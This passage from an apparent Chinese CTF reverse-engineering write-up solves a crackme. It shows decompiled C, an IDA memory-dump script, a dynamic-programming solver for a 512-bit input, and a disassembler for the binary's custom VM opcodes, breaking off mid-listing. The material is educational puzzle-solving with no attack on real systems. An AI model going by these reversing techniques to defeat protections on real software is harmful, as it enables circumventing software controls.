class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v12 &lt; v29 );</span><br><span class="line">  <span class="keyword">if</span> ( SHIDWORD(v30) &gt; <span class="number">0</span> || v30 &gt;= <span class="number">0</span> &amp;&amp; (_DWORD)v30 )</span><br><span class="line">    <span class="keyword">return</span> MessageBoxA(<span class="number">0</span>, <span class="string">&quot;Try Again!&quot;</span>, <span class="string">&quot;tip&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  v18 = (<span class="keyword">void</span> (__stdcall *)(<span class="keyword">int</span> *, __int64 *, <span class="keyword">int</span>))v4[<span class="number">56</span>];</span><br><span class="line">  v19 = v4[<span class="number">57</span>];</span><br><span class="line">  LODWORD(v30) = <span class="number">-1</span>;</span><br><span class="line">  v18(v4, &amp;v30, v19);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)v30 == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> MessageBoxA(<span class="number">0</span>, <span class="string">&quot;Try Again!&quot;</span>, <span class="string">&quot;tip&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  v20 = v4[<span class="number">50</span>];</span><br><span class="line">  v21 = GdipGetImagePixelFormat(*(_DWORD *)(v20 + <span class="number">4</span>), &amp;v29);</span><br><span class="line">  <span class="keyword">if</span> ( v21 )</span><br><span class="line">    *(_DWORD *)(v20 + <span class="number">8</span>) = v21;</span><br><span class="line">  v22 = v4[<span class="number">50</span>];</span><br><span class="line">  v23 = GdipBitmapLockBits(*(_DWORD *)(v22 + <span class="number">4</span>), v4[<span class="number">49</span>], <span class="number">7</span>, v29, v4[<span class="number">51</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( v23 )</span><br><span class="line">    *(_DWORD *)(v22 + <span class="number">8</span>) = v23;</span><br><span class="line">  memcpy_0(&amp;v9[HIDWORD(v30) + v30 * v4[<span class="number">58</span>]], v32, <span class="number">4</span> * v31);</span><br><span class="line">  v24 = v4[<span class="number">50</span>];</span><br><span class="line">  v25 = GdipBitmapUnlockBits(*(_DWORD *)(v24 + <span class="number">4</span>), v4[<span class="number">51</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( v25 )</span><br><span class="line">    *(_DWORD *)(v24 + <span class="number">8</span>) = v25;</span><br><span class="line">  sub_1062880();</span><br><span class="line">  MessageBoxA(<span class="number">0</span>, <span class="string">&quot;You get it!&quot;</span>, <span class="string">&quot;tip&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  sub_106C00A(<span class="number">1000</span>);</span><br><span class="line">  <span class="keyword">return</span> sub_106C22D(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这一句限制了输入必须为0 or 1:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v15 != <span class="string">&#x27;0&#x27;</span> &amp;&amp; v15 != <span class="string">&#x27;1&#x27;</span> )</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>调试运行过程中, 可知v13 = 0x200:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v13 = v4[<span class="number">58</span>];                               <span class="comment">// 0x200                           if ( v12 &gt;= v13 )                           // 0x200 * 0x200</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这一部分的逻辑很像之前做过的Bugku里面的</p><p>因为静态找不到mountain, 所以只能在动态调试过程中将mountain dump出来, 脚本如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line">addr = <span class="number">0x03A24020</span></span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">&quot;data.txt&quot;</span>, <span class="string">&quot;wb+&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x200</span> * <span class="number">0x200</span>):</span><br><span class="line">    fp.write(<span class="built_in">bytes</span>(ida_bytes.get_dword(addr + i * <span class="number">4</span>)))</span><br><span class="line">    fp.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">fp.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10256753</span><br><span class="line">15502165</span><br><span class="line">5303425</span><br><span class="line">3</span><br><span class="line">....</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>动态规划求解:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy</span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&quot;data.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="built_in">input</span> = []</span><br><span class="line">line = data.readline()</span><br><span class="line">data_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x200</span>):</span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x200</span>):</span><br><span class="line">        num = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, line.split()))</span><br><span class="line">        tmp.append(num)</span><br><span class="line">        line = data.readline()</span><br><span class="line">    data_list.append(tmp)</span><br><span class="line">data.close()</span><br><span class="line">data = numpy.array(data_list)</span><br><span class="line"></span><br><span class="line">path = [<span class="string">&quot;&quot;</span>]  * <span class="built_in">len</span>(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data) - <span class="number">1</span>)[::-<span class="number">1</span>]:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> data[i+<span class="number">1</span>][j] &gt; data[i+<span class="number">1</span>][j+<span class="number">1</span>]:</span><br><span class="line">            t = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">            <span class="built_in">max</span> = data[i+<span class="number">1</span>][j]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            t = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">            <span class="built_in">max</span> = data[i+<span class="number">1</span>][j+<span class="number">1</span>]</span><br><span class="line">        path[i] += t</span><br><span class="line">        data[i][j] += <span class="built_in">max</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(hex(data[0][0][0]))</span></span><br><span class="line"><span class="built_in">input</span> = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x200</span> - <span class="number">1</span>):</span><br><span class="line">    <span class="built_in">input</span> += path[i][j]</span><br><span class="line">    <span class="keyword">if</span> path[i][j] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">input</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(<span class="built_in">input</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>求得512位输入:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000010101000000000111100111111110100111100101001000101010010011101100111101011111111111111111001110111011011000000101110111001111100100011000000000000110001111110100000000001101110111010101011111000101110000011000111001110000000000000000000000011001000010000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000011100011111110000100111000000000000000000000000000000010000000000000001000001100000000000000101000000000100000010000000000000000010000000000000000000000</span><br></pre></td></tr></table></figure><h3 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h3><p>接着分析这个函数:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v18(v4, &amp;v30, v19);</span><br></pre></td></tr></table></figure><p>在动态调试过程中可以将汇编代码转成一个函数进行静态分析:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __stdcall <span class="title">sub_3B46020</span><span class="params">(_DWORD *a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [esp+D0h] [ebp-28Ch]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+DCh] [ebp-280h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [esp+E8h] [ebp-274h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+F0h] [ebp-26Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [esp+F4h] [ebp-268h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+F8h] [ebp-264h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [esp+FCh] [ebp-260h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [esp+100h] [ebp-25Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [esp+104h] [ebp-258h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [esp+108h] [ebp-254h]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [esp+10Ch] [ebp-250h]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [esp+110h] [ebp-24Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [esp+114h] [ebp-248h]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [esp+118h] [ebp-244h]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [esp+11Ch] [ebp-240h]</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// [esp+120h] [ebp-23Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// [esp+124h] [ebp-238h]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [esp+2F0h] [ebp-6Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v22; <span class="comment">// [esp+2FCh] [ebp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> v23; <span class="comment">// [esp+308h] [ebp-54h]</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// [esp+314h] [ebp-48h]</span></span><br><span class="line">  <span class="keyword">int</span> v25; <span class="comment">// [esp+320h] [ebp-3Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v26; <span class="comment">// [esp+32Ch] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> v27; <span class="comment">// [esp+338h] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> v28; <span class="comment">// [esp+344h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v29; <span class="comment">// [esp+350h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v29 = a1[<span class="number">53</span>] + <span class="number">2</span> * a1[<span class="number">58</span>];</span><br><span class="line">  v28 = a1[<span class="number">55</span>] + <span class="number">12</span>;</span><br><span class="line">  v27 = *(_DWORD *)a1[<span class="number">55</span>];</span><br><span class="line">  v26 = *(_DWORD *)(a1[<span class="number">55</span>] + <span class="number">4</span>);</span><br><span class="line">  v25 = *(_DWORD *)(a1[<span class="number">55</span>] + <span class="number">8</span>);</span><br><span class="line">  v24 = v28;</span><br><span class="line">  v23 = <span class="number">0</span>;</span><br><span class="line">  v22 = <span class="number">0</span>;</span><br><span class="line">  v21 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>i64;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  v13 = v29;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  v16 = v27;</span><br><span class="line">  v17 = v26;</span><br><span class="line">  v18 = v25;</span><br><span class="line">  v19 = v28;</span><br><span class="line">  v20 = a2;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v23 + a3;</span><br><span class="line">    <span class="keyword">if</span> ( !*(_BYTE *)(v23 + a3) )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    v21 += (*(<span class="keyword">char</span> *)(v23 + a3) - <span class="number">48</span>) &lt;&lt; v23 % <span class="number">6</span>;</span><br><span class="line">    result = v23 / <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v23 % <span class="number">6</span> != <span class="number">5</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_76;</span><br><span class="line">    <span class="keyword">switch</span> ( v21 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        v21 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">24</span>; ++i )</span><br><span class="line">          v21 += (*(<span class="keyword">char</span> *)(++v23 + a3) - <span class="number">48</span>) &lt;&lt; i;</span><br><span class="line">        LODWORD(v6) = v21;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_75;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        v21 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">24</span>; ++j )</span><br><span class="line">          v21 += (*(<span class="keyword">char</span> *)(++v23 + a3) - <span class="number">48</span>) &lt;&lt; j;</span><br><span class="line">        HIDWORD(v6) = v21;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_75;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        LODWORD(v6) = *(<span class="keyword">unsigned</span> __int16 *)(v29 + <span class="number">2</span> * v22++);</span><br><span class="line">LABEL_75:</span><br><span class="line">        v21 = <span class="number">0</span>;</span><br><span class="line">LABEL_76:</span><br><span class="line">        ++v23;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        HIDWORD(v6) = v6;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_75;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v8 = v7;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_75;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v6 &lt; <span class="number">128</span> )</span><br><span class="line">          *((_DWORD *)&amp;v6 + v6) = HIDWORD(v6);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_75;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">if</span> ( SHIDWORD(v6) &lt; <span class="number">128</span> )</span><br><span class="line">          LODWORD(v6) = *((_DWORD *)&amp;v6 + HIDWORD(v6));</span><br><span class="line">        <span class="keyword">goto</span> LABEL_75;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v7 &lt; <span class="number">128</span> )</span><br><span class="line">          *((_DWORD *)&amp;v6 + v7) = v8;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_75;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v8 &lt; <span class="number">128</span> )</span><br><span class="line">          v7 = *((_DWORD *)&amp;v6 + v8);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_75;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">        LODWORD(v6) = *(_DWORD *)(v6 + <span class="number">4</span> * HIDWORD(v6));</span><br><span class="line">        <span class="keyword">goto</span> LABEL_75;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">        *(_DWORD *)(v6 + <span class="number">4</span> * HIDWORD(v6)) = v9;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_75;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">        LODWORD(v6) = HIDWORD(v6) + v6;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_75;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">        LODWORD(v6) = v6 - HIDWORD(v6);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_75;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">13</span>:</span><br><span class="line">        LODWORD(v6) = HIDWORD(v6) * v6;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_75;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">14</span>:</span><br><span class="line">        LODWORD(v6) = (<span class="keyword">signed</span> <span class="keyword">int</span>)v6 / SHIDWORD(v6);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_75;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">15</span>:</span><br><span class="line">        LODWORD(v6) = HIDWORD(v6) &amp; v6;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_75;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">        LODWORD(v6) = HIDWORD(v6) | v6;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_75;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">17</span>:</span><br><span class="line">        LODWORD(v6) = HIDWORD(v6) ^ v6;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_75;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">18</span>:</span><br><span class="line">        LODWORD(v6) = (_DWORD)v6 &lt;&lt; SBYTE4(v6);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_75;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">19</span>:</span><br><span class="line">        LODWORD(v6) = (<span class="keyword">signed</span> <span class="keyword">int</span>)v6 &gt;&gt; SBYTE4(v6);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_75;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">20</span>:</span><br><span class="line">        LODWORD(v6) = (<span class="keyword">signed</span> <span class="keyword">int</span>)v6 &gt; SHIDWORD(v6);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_75;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">21</span>:</span><br><span class="line">        LODWORD(v6) = (<span class="keyword">signed</span> <span class="keyword">int</span>)v6 &lt; SHIDWORD(v6);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_75;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">22</span>:</span><br><span class="line">        LODWORD(v6) = v6 == HIDWORD(v6);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_75;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">23</span>:</span><br><span class="line">        LODWORD(v6) = v6 != HIDWORD(v6);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_75;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">24</span>:</span><br><span class="line">        LODWORD(v6) = v23;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_75;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">25</span>:</span><br><span class="line">        v23 = v6;</span><br><span class="line">        v21 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">26</span>:</span><br><span class="line">        <span class="keyword">if</span> ( (_DWORD)v6 )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_75;</span><br><span class="line">        v23 = HIDWORD(v6);</span><br><span class="line">        v21 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>大概是个VM, 调试过程中将操作码dump出来, 嗯, 复制粘贴</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20190725195653.png" alt="vm"></p><p>之后分析VM过程, 写个脚本将过程大致还原一下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">code = <span class="string">&#xx27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">opcode = <span class="number">0</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="comment">#LODWORD(x) = r0</span></span><br><span class="line"><span class="comment">#HIDWORD(x) = r1</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">len</span>(code):</span><br><span class="line">    opcode = <span class="built_in">eval</span>(<span class="string">&#x27;0b&#x27;</span>+ code[i:i+<span class="number">6</span>][::-<span class="number">1</span>])</span><br><span class="line">    i += <span class="number">6</span></span><br><span class="line">    <span class="keyword">if</span> opcode == <span class="number">0</span>:</span><br><span class="line">        num = <span class="built_in">eval</span>(<span class="string">&#x27;0b&#x27;</span>+ code[i:i+<span class="number">24</span>][::-<span class="number">1</span>])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;mov r0, 0x%x&#x27;</span>%num)</span><br><span class="line">        i += <span class="number">24</span></span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="number">1</span>:</span><br><span class="line">        num = <span class="built_in">eval</span>(<span class="string">&#x27;0b&#x27;</span>+ code[i:i+<span class="number">24</span>][::-<span class="number">1</span>])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;mov r1, 0x%x&#x27;</span>%num)</span><br><span class="line">        i += <span class="number">24</span></span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;mov r0, input[%d]&#x27;</span>% j)</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;mov r1, r0&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;mov r3, r2&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;if r0 &lt; 128:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\tmov x[r0], r1&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="number">6</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;if r1 &lt; 128:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\tmov r0, x[r1]&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="number">7</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;if r3 &lt; 128:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\tmov x[r2], r3&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="number">8</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;if r2 &lt; 128:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\tmov r2, x[r3]&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="number">9</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;mov r0, x[4 * r1]&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="number">0xA</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;mov x[4 * r1], r4&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="number">0xB</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;add r0, r1&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="number">0xC</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;sub r0, r1&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="number">0xD</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;mul r0, r1&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="number">0xE</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;div r0, r1&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="number">0xF</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;and r0, r1&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="number">0x10</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;or r0, r1&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="number">0x11</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;xor r0, r1&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="number">0x12</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;shl r0, r1&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="number">0x13</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;shr r0, r1&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="number">0x14</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;cmp r0, r1&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;setnle r0&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="number">0x15</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;cmp r0, r1&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;setl r0&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="number">0x16</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;cmp r0, r1&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;setz r0&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="number">0x17</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;cmp r0, r1&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;setnz r0&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="number">0x18</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;mov r0, rip&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="number">0x19</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;mov rip, r0&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> opcode == <span class="number">0x1A</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;cmp r0, 0&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;je r1&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&lt;unknown&gt;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov r0, 0x26a</span><br><span class="line">mov r1, r0</span><br><span class="line">mov r0, input[0]</span><br><span class="line">cmp r0, 0</span><br><span class="line">je r1</span><br><span class="line">mov r1, 0x30</span><br><span class="line">sub r0, r1</span><br><span class="line">mov r1, r0</span><br><span class="line">mov r0, 0x3</span><br><span class="line">if r0 &lt; 128:</span><br><span class="line">    mov x[r0], r1</span><br><span class="line">mov r0, 0x0</span><br><span class="line">mov r1, r0</span><br><span class="line">mov r0, 0x2</span><br><span class="line">if r0 &lt; 128:</span><br><span class="line">    mov x[r0], r1</span><br><span class="line">mov r0, 0x7</span><br><span class="line">mov r1, r0</span><br><span class="line">if r1 &lt; 128:</span><br><span class="line">    mov r0, x[r1]</span><br><span class="line">mov r1, r0</span><br><span class="line">if r3 &lt; 128:</span><br><span class="line">    mov x[r2], r3</span><br><span class="line">shl r0, r1</span><br><span class="line">mov r1, r0</span><br><span class="line">mov r0, 0x3</span><br><span class="line">if r0 &lt; 128:</span><br><span class="line">    mov x[r0], r1</span><br><span class="line">mov r0, 0x1</span><br><span class="line">mov r1, r0</span><br><span class="line">mov r0, 0x2</span><br><span class="line">if r0 &lt; 128:</span><br><span class="line">    mov x[r0], r1</span><br><span class="line">mov r0, 0x6</span><br><span class="line">mov r1, r0</span><br><span class="line">if r1 &lt; 128:</span><br><span class="line">    mov r0, x[r1]</span><br><span class="line">if r3 &lt; 128:</span><br><span class="line">    mov x[r2], r3</span><br><span class="line">add r0, r1</span><br><span class="line">mov r1, r0</span><br><span class="line">mov r0, 0x6</span><br><span class="line">if r0 &lt; 128:</span><br><span class="line">    mov x[r0], r1</span><br><span class="line">mov r1, 0x7</span><br><span class="line">if r1 &lt; 128:</span><br><span class="line">    mov r0, x[r1]</span><br><span class="line">mov r1, 0x1</span><br><span class="line">add r0, r1</span><br><span class="line">mov r1, r0</span><br><span class="line">mov r0, 0x7</span><br><span class="line">if r0 &lt; 